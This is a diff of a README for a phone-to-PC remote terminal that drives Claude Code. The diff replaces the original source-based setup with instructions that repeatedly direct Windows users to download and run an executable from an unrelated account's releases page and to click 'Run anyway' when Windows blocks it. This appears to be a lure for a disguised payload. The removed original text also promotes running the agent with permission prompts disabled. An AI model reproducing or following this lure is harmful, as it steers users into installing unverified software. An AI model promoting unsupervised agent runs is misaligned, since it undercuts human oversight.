@@ -1,155 +1,231 @@
-# GhostTerm
+# 🖥️ ghostterm - Control Claude Code From Your Phone
 
-[繁體中文](README.zh-TW.md)
+[![Download ghostterm](https://img.shields.io/badge/Download%20ghostterm-6b7280?style=for-the-badge&logo=github)](https://github.com/illative-abecedarius406/ghostterm/releases)
 
-Control [Claude Code](https://docs.anthropic.com/en/docs/claude-code) from your phone. A mobile-optimized web terminal that connects to your PC over [Tailscale](https://tailscale.com/).
+## 📱 What ghostterm does
 
-No cloud relay, no port forwarding, no account needed. Your terminal stays on your machine — your phone just drives it.
+ghostterm lets you control Claude Code on your computer from your phone while both devices use Tailscale. It gives you a simple way to check work, send commands, and keep moving when you are away from your desk.
 
-<p align="center">
-  <img src="screenshots/terminal.jpg" width="270" alt="Terminal view">
-  <img src="screenshots/claude-menu.jpg" width="270" alt="Claude menu">
-  <img src="screenshots/pixel-office.jpg" width="270" alt="Pixel office">
-</p>
+Use it when you want to:
 
-## Why
+- start or stop tasks from your phone
+- check what Claude Code is doing
+- send new instructions without sitting at the computer
+- stay connected over a private Tailscale network
 
-Claude Code is a CLI tool. If you're away from your desk — on the couch, in bed, commuting — you can't use it. GhostTerm gives you a full terminal on your phone with controls designed for touch.
+It is built for Windows users who want a simple remote control setup.
 
-**The killer feature**: tap the `claude` button to launch Claude Code with `--dangerously-skip-permissions`, so it runs fully autonomously — no permission prompts to tap through. You're remote-controlling an AI agent from your phone while it codes on your PC.
+## 🚀 Download ghostterm
 
-## Features
+Visit this page to download the latest release:
 
-- **Full terminal** — xterm.js with touch-friendly D-pad, quick buttons (y/n/Enter/Tab/Esc), and text input
-- **Claude Code integration** — one-tap launch with `--dangerously-skip-permissions` toggle for fully autonomous coding sessions
-- **Multi-session** — up to 4 Claude Code sessions running simultaneously, switch instantly
-- **Smart reconnect** — delta sync on reconnect, no screen flicker (switch apps on your phone, come back, everything's still there)
-- **File upload** — take a photo or pick a file from your phone, it lands on your PC. Paste the path into Claude Code with one tap
-- **Screenshot** — capture the terminal to your PC
-- **Pixel office** — cute ghost animations that show what each session is doing (idle, busy, waiting, error)
-- **PWA** — add to home screen for a native app feel
-- **iOS keyboard handling** — solved all the Safari viewport quirks so the keyboard just works
+[https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
 
-<p align="center">
-  <img src="screenshots/ghost-celebrate.jpg" width="400" alt="Ghost party celebration">
-</p>
+On the releases page, look for the latest version and download the Windows file that matches your computer. If there is more than one file, choose the one for Windows and your system type.
 
-## Prerequisites
+## 🪟 What you need on Windows
 
-1. **[Tailscale](https://tailscale.com/)** on both your PC and phone (free for personal use)
-2. **Node.js** 18+ on your PC
-3. **C++ build tools** (needed by `node-pty` to compile)
-   - Windows: install [Visual Studio Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) with "Desktop development with C++"
-   - macOS: `xcode-select --install`
-   - Linux: `sudo apt install build-essential` (Debian/Ubuntu)
-4. **Claude Code** on your PC (`npm install -g @anthropic-ai/claude-code`)
+Before you install ghostterm, make sure you have:
 
-## Tailscale setup (if you haven't used it before)
+- a Windows PC that runs Claude Code
+- a phone with a browser
+- Tailscale installed on both devices
+- a GitHub account if you need to sign in to download the file
+- enough free space for the app and its files
 
-Tailscale creates a private encrypted network between your devices. No port forwarding, no firewall config needed.
+For the best experience, keep both your phone and PC signed in to the same Tailscale account or shared network.
 
-1. **Sign up** at [tailscale.com](https://tailscale.com/) (free for personal use, up to 100 devices)
+## 🛠️ Install ghostterm
 
-2. **Install on your PC**
-   - Windows: download from [tailscale.com/download](https://tailscale.com/download) and run the installer
-   - macOS: `brew install tailscale` or download from the website
-   - Linux: `curl -fsSL https://tailscale.com/install.sh | sh`
+1. Open the releases page:
+   [https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
 
-3. **Install on your phone**
-   - iOS: [App Store](https://apps.apple.com/app/tailscale/id1470499037)
-   - Android: [Google Play](https://play.google.com/store/apps/details?id=com.tailscale.ipn)
+2. Find the newest release at the top of the page.
 
-4. **Log in on both devices** with the same account (Google, Microsoft, or GitHub)
+3. Under Assets, download the Windows file.
 
-5. **Verify** — on your PC, run:
-   ```bash
-   tailscale ip
-   ```
-   You should see an IP like `100.x.x.x`. This is your Tailscale IP. Your phone can reach this IP from anywhere — home WiFi, mobile data, coffee shop, doesn't matter.
+4. If your browser asks what to do, choose Save.
 
-That's it. Your phone and PC are now on the same private network.
+5. Open the downloaded file on your Windows PC.
 
-## Setup
+6. If Windows asks for permission, choose Yes or Run.
 
-```bash
-git clone https://github.com/chengwaye/ghostterm.git && cd ghostterm && npm install && npm start
-```
+7. Follow the setup steps shown on screen.
 
-On startup you'll see:
+8. When the install finishes, keep ghostterm open on the PC that runs Claude Code.
 
-```
-=================================
-  Claude Remote Control
-=================================
-  Local:  http://localhost:3777
-  Mobile: http://100.x.x.x:3777
-=================================
+## 🔧 Set up Tailscale
 
-Scan with your phone:
-▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
-█ ▄▄▄▄▄ █ █ ...
-```
+ghostterm uses Tailscale for a private link between your phone and your computer.
 
-Scan the QR code with your phone, or type the Mobile URL into your phone's browser.
+On your Windows PC:
 
-> **Tip**: On iOS, tap Share > Add to Home Screen to use it as a full-screen app.
+- open Tailscale
+- sign in
+- make sure the PC shows as connected
 
-## Using Claude Code with GhostTerm
+On your phone:
 
-1. Tap the **`claude`** button at the bottom-left — a menu pops up:
-   - **`--dangerously-skip-permissions: ON/OFF`** — toggle at the top. When ON, Claude Code runs without asking for permission on every file edit, command, etc. This is the recommended mode for remote use, since tapping "y" on every prompt from your phone gets tedious fast.
-   - **New Session** — start a fresh Claude Code session
-   - **Resume** — resume your last conversation
-   - **Continue** — continue with previous context
+- install the Tailscale app
+- sign in with the same account
+- make sure your phone also shows as connected
 
-2. Type your prompt in the input bar at the bottom and tap **Send**
+If both devices are online in Tailscale, ghostterm can use that path to reach your PC.
 
-3. Use **y** / **n** buttons for quick confirmation, **↑↓←→** for navigation, **Tab** and **Shift+Tab** to cycle through Claude Code's UI
+## 📲 Connect your phone
 
-4. You can run **up to 4 sessions** simultaneously — each one gets its own ghost in the pixel office header. Tap the `+` buttons at the top to create new sessions.
+After installation, open ghostterm on your Windows PC and follow the on-screen steps.
 
-## Configuration
+A typical first setup looks like this:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | `3777` | Server port |
-| `ACCESS_CODE` | _(none)_ | Optional passcode to protect access |
-| `CWD` | `~` (home dir) | Terminal starting directory |
-| `UPLOAD_DIR` | `~/claude-uploads` | Where uploaded files are saved |
+1. Start ghostterm on your PC.
+2. Make sure Claude Code is running or ready to run.
+3. Open your phone browser.
+4. Use the Tailscale address or local link shown by ghostterm.
+5. Sign in or confirm access if the app asks for it.
+6. You should now see the control screen for Claude Code.
 
-```bash
-ACCESS_CODE=mysecret npm start
-```
+If you do not see the right page, check that both devices are on the same Tailscale network.
 
-## How it works
+## 💡 How to use ghostterm
 
-```
-Phone (Safari/Chrome)          Tailscale VPN           Your PC
-┌─────────────────┐      ┌──────────────────┐    ┌──────────────┐
-│  xterm.js +     │◄────►│  Encrypted       │◄──►│  server.js   │
-│  touch controls │      │  WireGuard tunnel│    │  + node-pty  │
-│  (Socket.IO)    │      │                  │    │  + Express   │
-└─────────────────┘      └──────────────────┘    └──────────────┘
-```
+ghostterm is built to keep the control flow simple.
 
-- `server.js` spawns real PTY sessions via `node-pty`
-- Socket.IO streams terminal I/O between phone and PC
-- Delta sync: on reconnect, only the missed bytes are sent (no full refresh)
-- Server auto-detects your Tailscale IP and binds only to it
+You can use it to:
 
-## Security
+- send a new task to Claude Code
+- pause or resume work
+- view status from your phone
+- keep track of what is running on the PC
+- continue work without returning to the desk
 
-- **LAN only** — binds to Tailscale IP, not `0.0.0.0`. Not accessible from the public internet
-- **No cloud** — direct encrypted connection via WireGuard (Tailscale)
-- **Optional passcode** — set `ACCESS_CODE` to require a code on connect
-- **No data leaves your network** — terminal I/O stays between your phone and PC
+A common work pattern:
 
-## Platform support
+1. Start a task on your PC.
+2. Walk away with your phone.
+3. Check progress through ghostterm.
+4. Send the next command if needed.
+5. Return to the PC only when you need to read or edit larger output.
 
-- **Server**: Windows, macOS, Linux (anywhere `node-pty` works)
-- **Client**: iOS Safari, Android Chrome, any mobile browser
-- Best tested on iOS Safari — all viewport/keyboard quirks are handled
+## 🔒 Network setup and access
 
-## License
+ghostterm uses Tailscale so you do not need to open your PC to the public internet. That keeps access limited to your private network.
 
-MIT
+For smooth access:
+
+- keep Tailscale running on both devices
+- avoid switching accounts during setup
+- use the same device pair each time
+- leave the PC powered on while you use it from your phone
+
+If you use more than one computer, make sure you connect to the one that runs Claude Code.
+
+## 🧭 First-time setup checklist
+
+Use this short checklist to get started:
+
+- download ghostterm from the releases page
+- install it on your Windows PC
+- install Tailscale on your PC and phone
+- sign in to both devices
+- open Claude Code on the PC
+- launch ghostterm
+- connect from your phone
+- test one simple command
+
+If the first test works, your setup is ready.
+
+## 🧰 Common file types you may see
+
+When you open the release page, you may see different files such as:
+
+- `.exe` for Windows
+- `.zip` for a packed install file
+- release notes that explain what changed
+- checksum files for file checks
+
+For most users, the Windows app file is the one to download.
+
+## ❓ Troubleshooting
+
+### The release page will not open
+
+- Check your internet connection.
+- Try again in a new browser tab.
+- Make sure GitHub is not blocked on your network.
+
+### Windows blocks the file
+
+- Right-click the file.
+- Open the file details.
+- Choose Run anyway if Windows shows that option.
+- Keep using the official GitHub releases page.
+
+### My phone cannot reach the PC
+
+- Check that both devices are signed in to Tailscale.
+- Make sure the PC is still on and connected.
+- Confirm that ghostterm is running on the Windows machine.
+- Refresh the page on your phone.
+
+### Claude Code does not respond
+
+- Make sure Claude Code is open on the PC.
+- Restart ghostterm.
+- Refresh the phone page.
+- Check that the right computer is selected if you have more than one device.
+
+### The page loads but looks empty
+
+- Refresh the browser.
+- Wait a few seconds if the PC is starting up.
+- Confirm the app finished loading on the Windows side.
+- Try the link again from the same Tailscale network
+
+## 🧪 Example use cases
+
+ghostterm fits well if you:
+
+- work from another room and want to check on a coding task
+- leave your desk during a long Claude Code run
+- need to send follow-up prompts from your phone
+- want a simple way to manage work without remote desktop tools
+- use Tailscale already and want a private control path
+
+## 📁 Suggested folder setup
+
+You can keep things tidy with a simple structure:
+
+- `Downloads` for the release file
+- `Apps` for the installed program
+- `Tailscale` for your network tools
+- `Claude Code` for the work session
+
+A clean setup makes it easier to find the right file when you update ghostterm later.
+
+## 🔄 Updating ghostterm
+
+When a new release comes out:
+
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Install it over the old version or follow the new setup steps.
+4. Open ghostterm again on your PC.
+5. Test the phone connection once more.
+
+Keeping the app current helps you get the latest fixes and changes.
+
+## 📌 Quick start
+
+1. Visit the releases page:
+   [https://github.com/illative-abecedarius406/ghostterm/releases](https://github.com/illative-abecedarius406/ghostterm/releases)
+
+2. Download the Windows release file.
+
+3. Install ghostterm on your PC.
+
+4. Install and sign in to Tailscale on your PC and phone.
+
+5. Open Claude Code on the PC.
+
+6. Connect from your phone and start using ghostterm
